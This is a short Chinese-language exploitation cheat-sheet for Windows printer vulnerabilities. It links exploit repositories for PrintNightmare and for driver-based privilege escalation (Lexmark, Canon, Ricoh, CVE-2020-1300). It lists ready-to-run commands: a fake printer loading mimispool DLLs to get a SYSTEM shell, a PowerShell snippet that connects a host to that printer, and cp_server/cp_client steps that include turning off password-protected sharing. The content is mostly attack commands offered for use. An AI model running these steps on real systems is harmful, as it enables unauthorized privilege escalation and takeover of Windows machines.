# 打印机漏洞

## **打印机噩梦-EXP：**

https://github.com/Flangvik/DeployPrinterNightmare

**利用方式如下：**

```bash
FakePrinter.exe 32mimispool.dll 64mimispool.dll EasySystemShell
```

```bash
$serverName  = 'printer-installed-host'
$printerName = 'EasySystemShell'
$fullprinterName = '\\' + $serverName + '\' + $printerName + ' - ' + $(If ([System.Environment]::Is64BitOperatingSystem) {'x64'} Else {'x86'})
Remove-Printer -Name $fullprinterName -ErrorAction SilentlyContinue
Add-Printer -ConnectionName $fullprinterName
```

## **自带漏洞-EXP：**

https://github.com/jacob-baines/concealed_position 是该漏洞的EXP

**ACIDDAMAGE ：**Lexmark 通用打印驱动程序 LPE  

**RADIANTDAMAGE：**佳能 TR150 打印驱动程序 LPE

**POISONDAMAGE：**Ricoh PCL6 打印驱动程序 LPE

**SLASHINGDAMAGE：**CVE-2020-1300 - Windows 打印后台处理程序 LPE

利用方式：

```bash
cp_server.exe -e ACIDDAMAGE
添加打印机
高级设置→关闭共享密码保护
cp_client.exe -r 10.0.0.9 -n ACIDDAMAGE -e ACIDDAMAGE
cp_client.exe -l -e ACIDDAMAGE
```